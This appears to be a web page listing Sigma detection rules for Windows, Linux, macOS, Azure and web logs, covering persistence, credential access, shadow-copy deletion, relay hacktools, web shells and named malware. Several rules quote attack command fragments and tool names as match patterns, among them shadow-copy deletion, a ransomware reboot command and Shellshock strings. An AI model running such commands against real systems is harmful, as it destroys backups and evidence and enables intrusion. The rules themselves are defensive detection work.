<li><a href="#">title:Service Installation with Suspicious Folder Pattern id: 1b2ae822-6fe1-43ba-aa7c-d1a3b3d1d5f2 status: experimental description: Detects service installation with suspicious folder patterns author: pH-T date: 2022/03/18 modified: 2022/03/24 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 suspicious1: - ImagePath|re: '^[Cc]:\\[Pp]rogram[Dd]ata\\.{1,9}\.exe' - ImagePath|re: '^[Cc]:\\.{1,9}\.exe' condition: selection and 1 of suspicious* falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - car.2013-09-005 - attack.t1543.003 
<li><a href="#">title:Service Registry Permissions Weakness Check id: 95afc12e-3cbb-40c3-9340-84a032e596a3 status: experimental description: | Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services references: - - author: frack113 date: 2021/12/30 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'get-acl' - 'REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\' condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.persistence - attack.t1574.011 
<li><a href="#">title:ServiceDll Modification id: 612e47e9-8a59-43a6-b404-f48683f45bd6 description: Detects the modification of a ServiceDLL value in the service settings author: frack113 date: 2022/02/04 modified: 2022/04/21 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\' TargetObject|endswith: '\Parameters\ServiceDll' filter_printextensionmanger: Details: 'C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll' filter_domain_controller: Image: 'C:\Windows\system32\lsass.exe' TargetObject|endswith: '\CurrentControlSet\Services\NTDS\Parameters\ServiceDll' Details: '%%systemroot%%\system32\ntdsa.dll' condition: selection and not 1 of filter* falsepositives: - Administrative scripts - Installation of a service level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 
<li><a href="#">title:Serv-U Exploitation CVE-2021-35211 by DEV-0322 id: 75578840-9526-4b2a-9462-af469a45e767 status: experimental description: Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322 author: Florian Roth date: 2021/07/14 references: - logsource: category: process_creation product: windows tags: - attack.persistence - attack.t1136.001 - cve.2021.35211 # - threat_group.DEV-0322 detection: selection1: CommandLine|contains: 'whoami' selection2: CommandLine|contains: - './Client/Common/' - '.\Client\Common\' selection3: CommandLine|contains: 'C:\Windows\Temp\Serv-U.bat' condition: selection1 and selection2 or selection3 falsepositives: - Unlikely level: critical 
<li><a href="#">title:Session Manager Autorun Keys Modification id: 046218bd-e0d8-4113-a3c3-895a12b2b298 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: session_manager_base: EventType: SetValue TargetObject|contains: '\System\CurrentControlSet\Control\Session Manager' session_manager: TargetObject|contains: - '\SetupExecute' - '\S0InitialCommand' - '\KnownDlls' - '\Execute' - '\BootExecute' - '\AppCertDlls' filter: Details: '(Empty)' condition: session_manager_base and session_manager and not filter fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Set Suspicious Files as System Files Using Attrib id: efec536f-72e8-4656-8960-5e85d091345b related: - id: bb19e94c-59ae-4c15-8c12-c563d23fe52b type: derived status: experimental description: Detects usage of attrib with "+s" option to set suspcious script or executable as system files to hide them from users and make them unable to delete with simple rights. The rule limit the search to sepcific extensions and directories to avoid FP's author: Nasreddine Bencherchali references: - - date: 2022/06/28 logsource: category: process_creation product: windows detection: selection_basic: Image|endswith: \attrib.exe CommandLine|contains: ' +s' selection_paths: CommandLine|contains: - ' %' # Custom Environment variable - '\Users\Public\' - '\AppData\Local\' - '\ProgramData\' - '\Downloads\' - '\Windows\Temp\' selection_ext: CommandLine|contains: - '.bat' - '.ps1' - '.vbe' - '.vbs' - '.exe' filter: CommandLine|contains|all: - '\Windows\TEMP\' - '.exe' condition: all of selection* and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:Set TimeProviders DllName id: e88a6ddc-74f7-463b-9b26-f69fc0d2ce85 status: experimental description: | Detects processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider. Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. author: frack113 date: 2022/06/19 references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|startswith: 'HKLM\System\CurrentControlSet\Services\W32Time\TimeProviders' TargetObject|endswith: 'DllName' filter: Details: 'C:\Windows\SYSTEM32\w32time.DLL' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1547.003 
<li><a href="#">title:Set Windows System File with Attrib id: bb19e94c-59ae-4c15-8c12-c563d23fe52b status: experimental description: Marks a file as a system file using the attrib.exe utility author: frack113 references: - - date: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \attrib.exe CommandLine|contains: ' +s ' condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:Setting Change in Windows Firewall with Advanced Security id: 00bb5bd5-1379-4fcf-a965-a5b6f7478064 status: experimental description: Setting have been change in Windows Firewall author: frack113 date: 2022/02/19 modified: 2022/03/28 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: - 2002 # A Windows Firewall setting has changed. - 2003 # A Windows Firewall setting in the %1 profile has changed. - 2008 # Windows Firewall Group Policy settings have changed. The new settings have been applied # - 2010 # Network profile changed on an interface. condition: selection level: low 
<li><a href="#">title:Setuid and Setgid id: c21c4eaa-ba2e-419a-92b2-8371703cbe21 status: test description: Detects suspicious change of file privileges with chown and chmod commands author: Ã–mer GÃ¼nal references: - - date: 2020/06/16 modified: 2021/11/27 logsource: product: linux detection: selection1: - '*chown root*' selection2: - '* chmod u+s*' selection3: - '* chmod g+s*' condition: (selection1 and selection2) or (selection1 and selection3) falsepositives: - Legitimate administration activities level: low tags: - attack.persistence 
<li><a href="#">title:Shadow Copies Access via Symlink id: 40b19fa6-d835-400c-b301-41f3a2baacaf status: test description: Shadow Copies storage symbolic link creation using operating systems utilities author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - mklink - HarddiskVolumeShadowCopy condition: selection falsepositives: - Legitimate administrator working with shadow copies, access for backup purposes level: medium tags: - attack.credential_access - attack.t1003.002 - attack.t1003.003 
<li><a href="#">title:Shadow Copies Creation Using Operating Systems Utilities id: b17ea6f7-6e90-447e-a799-e6c0a493d6ce status: test description: Shadow Copies creation using operating systems utilities, possible credential access author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community references: - - date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\powershell.exe' - '\wmic.exe' - '\vssadmin.exe' CommandLine|contains|all: - shadow - create condition: selection falsepositives: - Legitimate administrator working with shadow copies, access for backup purposes level: medium tags: - attack.credential_access - attack.t1003 - attack.t1003.002 - attack.t1003.003 
<li><a href="#">title:Shadow Copies Deletion Using Operating Systems Utilities id: c947b146-0abc-4c87-9c64-b17e9d7274a2 status: stable description: Shadow Copies deletion using operating systems utilities author: Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades) date: 2019/10/22 modified: 2022/05/16 references: - - - - - - - - tags: - attack.defense_evasion - attack.impact - attack.t1070 - attack.t1490 logsource: category: process_creation product: windows detection: selection1_img: - Image|endswith: - '\powershell.exe' - '\wmic.exe' - '\vssadmin.exe' - '\diskshadow.exe' - OriginalFileName: - 'PowerShell.EXE' - 'wmic.exe' - 'VSSADMIN.EXE' - 'diskshadow.exe' selection1_cli: CommandLine|contains|all: - shadow # will match "delete shadows" and "shadowcopy delete" and "shadowstorage" - delete selection2_img: - Image|endswith: '\wbadmin.exe' - OriginalFileName: 'WBADMIN.EXE' selection2_cli: CommandLine|contains|all: - delete - catalog - quiet # will match -quiet or /quiet selection3_img: - Image|endswith: '\vssadmin.exe' - OriginalFileName: 'VSSADMIN.EXE' selection3_cli: CommandLine|contains|all: - resize - shadowstorage - unbounded condition: (all of selection1*) or (all of selection2*) or (all of selection3*) fields: - CommandLine - ParentCommandLine falsepositives: - Legitimate Administrator deletes Shadow Copies using operating systems utilities for legitimate reason - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand) level: high 
<li><a href="#">title:SharpHound Recon Account Discovery id: 65f77b1e-8e79-45bf-bb67-5988a8ce45a5 description: Detects remote RPC calls useb by SharpHound to map remote connections and local group membership. references: - - - - - tags: - attack.t1087 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:6bffd098-a112-3610-9833-46c3f87e345a opnum:2' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 6bffd098-a112-3610-9833-46c3f87e345a OpNum: 2 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:SharpHound Recon Sessions id: 6d580420-ff3f-4e0e-b6b0-41b90c787e28 description: Detects remote RPC calls useb by SharpHound to map remote connections and local group membership. references: - - - - - tags: - attack.t1033 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:4b324fc8-1670-01d3-1278-5a47bf6ee188 opnum:12' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 4b324fc8-1670-01d3-1278-5a47bf6ee188 OpNum: 12 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Shell Open Registry Keys Manipulation id: 152f3630-77c1-4284-bcc0-4cc68ab2f6e7 description: Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62) author: Christian Burkard date: 2021/08/30 modified: 2022/01/13 status: experimental references: - - - - [Lokibot sample from Nov 2021] tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1546.001 logsource: category: registry_event product: windows detection: selection1: EventType: SetValue TargetObject|endswith: 'Classes\ms-settings\shell\open\command\SymbolicLinkValue' Details|contains: '\Software\Classes\{' selection2: TargetObject|endswith: 'Classes\ms-settings\shell\open\command\DelegateExecute' selection3: EventType: SetValue TargetObject|endswith: - 'Classes\ms-settings\shell\open\command\(Default)' - 'Classes\exefile\shell\open\command\(Default)' filter_sel3: Details: '(Empty)' condition: selection1 or selection2 or (selection3 and not filter_sel3) falsepositives: - Unknown level: high 
<li><a href="#">title:Shell32 DLL Execution in Suspicious Directory id: 32b96012-7892-429e-b26c-ac2bf46066ff description: Detects shell32.dll executing a DLL in a suspicious directory status: experimental references: - tags: - attack.defense_evasion - attack.execution - attack.t1218.011 author: Christian Burkard date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains|all: - 'shell32.dll' - 'Control_RunDLL' CommandLine|contains: - '%AppData%' - '%LocalAppData%' - '%Temp%' - '\AppData\' - '\Temp\' - '\Users\Public\' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Shellcode Injection id: 250ae82f-736e-4844-a68b-0b5e8cc887da status: experimental description: Detects shellcode injection by Metasploit's migrate and Empire's psinject author: Bhabesh Raj date: 2022/03/11 tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: category: process_access product: windows detection: selection: GrantedAccess: - '0x147a' - '0x1f3fff' CallTrace|contains: 'UNKNOWN' condition: selection falsepositives: - Empire's csharp_exe payload uses 0x1f3fff for process enumeration as well level: high 
<li><a href="#">title:Shells Spawn by Java id: dff1e1cc-d3fd-47c8-bfc2-aeb878a754c0 description: Detects shell spawn from Java host process, which could a maintenance task or some kind of exploitation (e.g. log4j exploitation) status: experimental author: Andreas Hunkeler (@Karneades) date: 2021/12/17 modified: 2022/01/12 tags: - attack.initial_access - attack.persistence - attack.privilege_escalation logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\java.exe' Image|endswith: '\cmd.exe' filter: ParentImage|contains: 'build' # excluding CI build agents CommandLine|contains: 'build' # excluding CI build agents condition: selection and not filter falsepositives: - Legitimate calls to system binaries - Company specific internal usage level: medium 
<li><a href="#">title:Shells Spawned by Web Servers id: 8202070f-edeb-4d31-a010-a26c72ac5600 status: test description: Web servers that spawn shell processes could be the result of a successfully placed web shell or an other attack author: Thomas Patzke, Florian Roth, Zach Stanford @svch0st date: 2019/01/16 modified: 2022/03/17 tags: - attack.persistence - attack.t1505.003 - attack.t1190 logsource: category: process_creation product: windows detection: selection_webserver_image: ParentImage|endswith: - '\w3wp.exe' - '\php-cgi.exe' - '\nginx.exe' - '\httpd.exe' - '\caddy.exe' - '\ws_TomcatService.exe' - '\tomcat.exe' - '\UMWorkerProcess.exe' # selection_webserver_characteristics_tomcat1: ParentImage|endswith: - '\java.exe' - '\javaw.exe' ParentImage|contains: - '-tomcat-' - '\tomcat' selection_webserver_characteristics_tomcat2: ParentImage|endswith: - '\java.exe' - '\javaw.exe' ParentCommandLine|contains: - 'catalina.jar' - 'CATALINA_HOME' - 'catalina.home' anomaly_children: Image|endswith: - '\cmd.exe' - '\sh.exe' - '\bash.exe' - '\powershell.exe' - '\bitsadmin.exe' condition: 1 of selection* and anomaly_children fields: - CommandLine - ParentCommandLine falsepositives: - Particular web applications may spawn a shell process legitimately level: high 
<li><a href="#">title:Shellshock Expression id: c67e0c98-4d39-46ee-8f6b-437ebf6b950e status: experimental description: Detects shellshock expressions in log files author: Florian Roth date: 2017/03/14 modified: 2021/04/28 references: - logsource: product: linux detection: keywords: - '(){:;};' - '() {:;};' - '() { :;};' - '() { :; };' condition: keywords falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:ShimCache Flush id: b0524451-19af-4efa-a46f-562a977f792e status: stable description: Detects actions that clear the local ShimCache and remove forensic evidence references: - tags: - attack.defense_evasion - attack.t1112 author: Florian Roth date: 2021/02/01 logsource: category: process_creation product: windows detection: selection1a: CommandLine|contains|all: - 'rundll32' - 'apphelp.dll' selection1b: CommandLine|contains: - 'ShimFlushCache' - '#250' selection2a: CommandLine|contains|all: - 'rundll32' - 'kernel32.dll' selection2b: CommandLine|contains: - 'BaseFlushAppcompatCache' - '#46' condition: ( selection1a and selection1b ) or ( selection2a and selection2b ) fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:Sign-in Failure Bad Password Threshold id: dff74231-dbed-42ab-ba49-83289be2ac3a description: Define a baseline threshold and then monitor and adjust to suit your organizational behaviors and limit false alerts from being generated. author: Corissa Koopmans, '@corissalea' date: 2022/04/21 references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 50126 ResultDescription: Invalid username or password or Invalid on-premises username or password. filter_computer: TargetUserName|endswith: '$' condition: selection and not filter_computer falsepositives: - Failed Azure AD Connect Synchronization - Service account use with an incorrect password specified - Misconfigured systems - Vulnerability scanners level: high status: experimental tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:Sign-in Failure Due to Conditional Access Requirements Not Met id: b4a6d707-9430-4f5f-af68-0337f52d5c42 description: Define a baseline threshold for failed sign-ins due to Conditional Access failures author: Yochana Henderson, '@Yochana-H' date: 2022/06/01 references: - logsource: product: azure service: signinlogs detection: selection: ResultType: 53003 Resultdescription: Blocked by Conditional Access condition: selection falsepositives: - Service Account misconfigured - Misconfigured Systems - Vulnerability Scanners level: high status: experimental tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:Sign-ins by Unknown Devices id: 4d136857-6a1a-432a-82fc-5dd497ee5e7c description: Monitor and alert for Sign-ins by unknown devices from non-Trusted locations. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: signinlogs detection: selection: AuthenticationRequirement: singleFactorAuthentication ResultType: '0' NetworkLocationDetails: '[]' DeviceDetail.deviceId: '' condition: selection falsepositives: - Unknown level: low status: experimental tags: - attack.valid_accounts - attack.t1078 
<li><a href="#">title:Sign-ins from Non-Compliant Devices id: 4f77e1d7-3982-4ee0-8489-abf2d6b75284 description: Monitor and alert for sign-ins where the device was non-compliant. author: Michael Epping, '@mepples21' date: 2022/06/28 references: - logsource: product: azure service: signinlogs detection: selection: DeviceDetail.isCompliant: 'false' condition: selection falsepositives: - Unknown level: high status: experimental tags: - attack.valid_accounts - attack.t1078 
<li><a href="#">title:Silence.Downloader V3 id: 170901d1-de11-4de7-bccb-8fa13678d857 status: test description: Detects Silence downloader. These commands are hardcoded into the binary. author: Alina Stepchenkova, Roman Rezvukhin, Group-IB, oscd.community date: 2019/11/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_recon: Image|endswith: - '\tasklist.exe' - '\qwinsta.exe' - '\ipconfig.exe' - '\hostname.exe' CommandLine|contains: '>>' CommandLine|endswith: 'temps.dat' selection_persistence: CommandLine|contains: '/C REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinNetworkSecurity" /t REG_SZ /d' condition: selection_recon or selection_persistence # requires both fields: - ComputerName - User - Image - CommandLine falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 - attack.discovery - attack.t1057 - attack.t1082 - attack.t1016 - attack.t1033 - attack.g0091 
<li><a href="#">title:Silence.EDA Detection id: 3ceb2083-a27f-449a-be33-14ec1b7cc973 status: test description: Detects Silence empireDNSagent author: Alina Stepchenkova, Group-IB, oscd.community date: 2019/11/01 modified: 2021/11/27 logsource: product: windows service: powershell detection: empire: ScriptBlockText|contains|all: # better to randomise the order - 'System.Diagnostics.Process' - 'Stop-Computer' - 'Restart-Computer' - 'Exception in execution' - '$cmdargs' - 'Close-Dnscat2Tunnel' dnscat: ScriptBlockText|contains|all: # better to randomise the order - 'set type=$LookupType`nserver' - '$Command | nslookup 2>&1 | Out-String' - 'New-RandomDNSField' - '[Convert]::ToString($SYNOptions, 16)' - '$Session.Dead = $True' - '$Session["Driver"] -eq' condition: empire and dnscat falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1071.004 - attack.t1572 - attack.impact - attack.t1529 - attack.g0091 - attack.s0363 
<li><a href="#">title:SilentProcessExit Monitor Registrytion for LSASS id: 55e29995-75e7-451a-bef0-6225e2f13597 description: Detects changes to the Registry in which a monitor program gets registered to dump process memory of the lsass.exe process memory status: experimental author: Florian Roth references: - - date: 2021/02/26 tags: - attack.credential_access - attack.t1003.007 logsource: category: registry_event product: windows detection: selection: TargetObject|contains: 'Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:SilentProcessExit Monitor Registrytion id: c81fe886-cac0-4913-a511-2822d72ff505 description: Detects changes to the Registry in which a monitor program gets registered to monitor the exit of another process status: experimental author: Florian Roth references: - - date: 2021/02/26 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: 'Microsoft\Windows NT\CurrentVersion\SilentProcessExit' Details|contains: 'MonitorProcess' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1546.012 
<li><a href="#">title:SILENTTRINITY Stager Execution id: 03552375-cc2c-4883-bbe4-7958d5a980be status: experimental description: Detects SILENTTRINITY stager use references: - author: Aleksey Potapov, oscd.community date: 2019/10/22 modified: 2021/09/19 tags: - attack.command_and_control - attack.t1071 logsource: category: process_creation product: windows detection: selection: Description|contains: 'st2stager' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:SILENTTRINITY Stager Execution id: 75c505b1-711d-4f68-a357-8c3fe37dbf2d related: - id: 03552375-cc2c-4883-bbe4-7958d5a980be type: derived status: experimental description: Detects SILENTTRINITY stager use references: - author: Aleksey Potapov, oscd.community date: 2019/10/22 modified: 2021/10/04 tags: - attack.command_and_control - attack.t1071 logsource: category: image_load product: windows detection: selection: Description|contains: 'st2stager' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Silenttrinity Stager Msbuild Activity id: 50e54b8d-ad73-43f8-96a1-5191685b17a4 status: test description: Detects a possible remote connections to Silenttrinity c2 author: Kiran kumar s, oscd.community references: - date: 2020/10/11 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\msbuild.exe' filter: DestinationPort: - '80' - '443' Initiated: 'true' condition: selection and filter falsepositives: - Unknown level: high tags: - attack.execution - attack.t1127.001 
<li><a href="#">title:Sitecore Pre-Auth RCE CVE-2021-42237 id: 20c6ed1c-f7f0-4ea3-aa65-4f198e6acb0f status: experimental description: Detects exploitation attempts of Sitecore Experience Platform Pre-Auth RCE CVE-2021-42237 found in Report.ashx author: Florian Roth date: 2021/11/17 references: - - tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains: '/sitecore/shell/ClientBin/Reporting/Report.ashx' sc-status: 200 condition: selection falsepositives: - Vulnerability Scanning level: high 
<li><a href="#">title:SMB Create Remote File Admin Share id: b210394c-ba12-4f89-9117-44a2464b9511 status: test description: Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$). author: Jose Rodriguez (@Cyb3rPandaH), OTR (Open Threat Research) references: - - date: 2020/08/06 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 5145 ShareName|endswith: 'C$' AccessMask: '0x2' filter: SubjectUserName|endswith: '$' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:SMB Relay Attack Tools status: test id: 5589ab4f-a767-433c-961d-c91f3f704db1 description: Detects different hacktools used for relay attacks on Windows for privilege escalation author: Florian Roth date: 2021/07/24 modified: 2022/03/03 references: - - - - - - tags: - attack.execution - attack.t1557.001 logsource: category: process_creation product: windows detection: selection_pe: Image|contains: - 'PetitPotam' - 'RottenPotato' - 'HotPotato' - 'JuicyPotato' - '\just_dce_' - 'Juicy Potato' - '\temp\rot.exe' - '\Potato.exe' - '\SpoolSample.exe' - '\Responder.exe' - '\smbrelayx' - '\ntlmrelayx' selection_script: CommandLine|contains: - 'Invoke-Tater' - ' smbrelay' - ' ntlmrelay' - 'cme smb ' - ' /ntlm:NTLMhash ' - 'Invoke-PetitPotam' filter_hotpotatoes: # known goodware Image|contains: - 'HotPotatoes6' - 'HotPotatoes 6' - 'HotPotatoes7' - 'HotPotatoes 7' - 'HotPotatoes Help' - 'HotPotatoes Tutorial' condition: 1 of selection_* and not 1 of filter_* falsepositives: - Legitimate files with these rare hacktool names level: critical 
<li><a href="#">title:SMB Spoolss Name Piped Usage id: bae2865c-5565-470d-b505-9496c87d0c30 description: Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled. status: experimental author: OTR (Open Threat Research), @neu5ron references: - - - tags: - attack.lateral_movement - attack.t1021.002 date: 2018/11/28 modified: 2021/08/23 logsource: product: zeek service: smb_files detection: selection: path|endswith: IPC$ name: spoolss condition: selection falsepositives: - Domain Controllers that are sometimes, commonly although should not be, acting as printer servers too level: medium 
<li><a href="#">title:smbexec.py Service Installation id: 52a85084-6989-40c3-8f32-091e12e13f09 status: test description: Detects the use of smbexec.py tool by detecting a specific service installation author: Omer Faruk Celik references: - date: 2018/03/20 modified: 2022/03/21 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: 'BTOBTO' ImagePath|endswith: '\execute.bat' condition: selection fields: - ServiceName - ServiceFileName falsepositives: - Unknown level: critical tags: - attack.lateral_movement - attack.execution - attack.t1021.002 - attack.t1569.002 
<li><a href="#">title:Snatch Ransomware id: 5325945e-f1f0-406e-97b8-65104d393fff status: stable description: Detects specific process characteristics of Snatch ransomware word document droppers author: Florian Roth references: - date: 2020/08/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: # Shutdown in safe mode immediately selection: CommandLine|contains: - 'shutdown /r /f /t 00' - 'net stop SuperBackupMan' condition: selection fields: - ComputerName - User - Image falsepositives: - Scripts that shutdown the system immediately and reboot them in safe mode are unlikely level: high tags: - attack.execution - attack.t1204 
<li><a href="#">title:Sofacy Trojan Loader Activity id: ba778144-5e3d-40cf-8af9-e28fb1df1e20 author: Florian Roth, Jonhnathan Ribeiro, oscd.community status: test date: 2018/03/01 modified: 2021/12/08 description: Detects Trojan loader activity as used by APT28 references: - - - tags: - attack.g0007 - attack.execution - attack.t1059.003 - attack.defense_evasion - car.2013-10-002 - attack.t1218.011 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'rundll32.exe' - '%APPDATA%\' selection2: - CommandLine|contains: '.dat",' - CommandLine|endswith: - '.dll",#1' - '.dll #1' - '.dll" #1' condition: selection1 and selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:Solarwinds SUPERNOVA Webshell Access id: a2cee20b-eacc-459f-861d-c02e5d12f1db status: experimental description: Detects access to SUPERNOVA webshell as described in Guidepoint report author: Florian Roth date: 2020/12/17 modified: 2021/08/09 references: - - tags: - attack.persistence - attack.t1505.003 logsource: category: webserver detection: selection1: c-uri|contains|all: - 'logoimagehandler.ashx' - 'clazz' selection2: c-uri|contains: 'logoimagehandler.ashx' sc-status: 500 condition: selection1 or selection2 fields: - client_ip - response falsepositives: - Unknown level: critical 
<li><a href="#">title:SonicWall SSL/VPN Jarrewrite Exploit id: 6f55f047-112b-4101-ad32-43913f52db46 status: experimental description: Detects exploitation attempts of the SonicWall Jarrewrite Exploit author: Florian Roth date: 2021/01/25 tags: - attack.t1190 - attack.initial_access references: - logsource: category: webserver detection: selection: c-uri|contains: '/cgi-bin/jarrewrite.sh' c-useragent|contains: - ':;' - '() {' - '/bin/bash -c' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high 
<li><a href="#">title:Source Code Enumeration Detection by Keyword id: 953d460b-f810-420a-97a2-cfca4c98e602 status: test description: Detects source code enumeration that use GET requests by keyword searches in URL strings author: James Ahearn references: - - date: 2019/06/08 modified: 2021/11/27 logsource: category: webserver detection: keywords: - '*.git/*' condition: keywords fields: - client_ip - vhost - url - response falsepositives: - Unknown level: medium tags: - attack.discovery - attack.t1083 
<li><a href="#">title:SOURGUM Actor Behaviours id: 7ba08e95-1e0b-40cd-9db5-b980555e42fd description: Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM author: MSTIC, FPT.EagleEye status: experimental level: high references: - - - date: 2021/06/15 modified: 2021/07/30 tags: - attack.t1546 - attack.t1546.015 - attack.persistence - attack.privilege_escalation logsource: product: windows category: process_creation detection: selection1: Image|contains: 'windows\system32\Physmem.sys' selection2: Image|contains: - 'Windows\system32\ime\SHARED\WimBootConfigurations.ini' - 'Windows\system32\ime\IMEJP\WimBootConfigurations.ini' - 'Windows\system32\ime\IMETC\WimBootConfigurations.ini' selection3: Image|contains: - 'windows\system32\filepath2' - 'windows\system32\ime' registry_command: CommandLine|contains: 'reg add' registry_key: CommandLine|contains: - 'HKEY_LOCAL_MACHINE\software\classes\clsid\{7c857801-7381-11cf-884d-00aa004b2e24}\inprocserver32' - 'HKEY_LOCAL_MACHINE\software\classes\clsid\{cf4cc405-e2c5-4ddd-b3ce-5e7582d8c9fa}\inprocserver32' condition: selection1 or selection2 or (selection3 and registry_command and registry_key) falsepositives: - Unknown 
<li><a href="#">title:Space After Filename - macOS id: b6e2a2e3-2d30-43b1-a4ea-071e36595690 status: experimental description: Detects attempts to masquerade as legitimate files by adding a space to the end of the filename. author: remotephone date: 2021/11/20 references: - logsource: product: macos category: process_creation detection: selection1: CommandLine|endswith: ' ' selection2: ImageName|endswith: ' ' condition: selection1 or selection2 falsepositives: - Mistyped commands or legitimate binaries named to match the pattern level: low tags: - attack.defense_evasion - attack.t1036.006 
<li><a href="#">title:Space After Filename id: 879c3015-c88b-4782-93d7-07adf92dbcb7 status: test description: Detects space after filename author: Ã–mer GÃ¼nal references: - date: 2020/06/17 modified: 2021/11/27 logsource: product: linux detection: selection1: - 'echo "*" > * && chmod +x *' selection2: - 'mv * "* "' condition: selection1 and selection2 falsepositives: - Typos level: low tags: - attack.execution 
<li><a href="#">title:'Split A File Into Pieces' id: 2dad0cba-c62a-4a4f-949f-5f6ecd619769 status: test description: 'Detection use of the command "split" to split files into parts and possible transfer.' author: 'Igor Fits, oscd.community' references: - date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'SYSCALL' comm: 'split' condition: selection falsepositives: - Legitimate administrative activity level: low tags: - attack.exfiltration - attack.t1030 
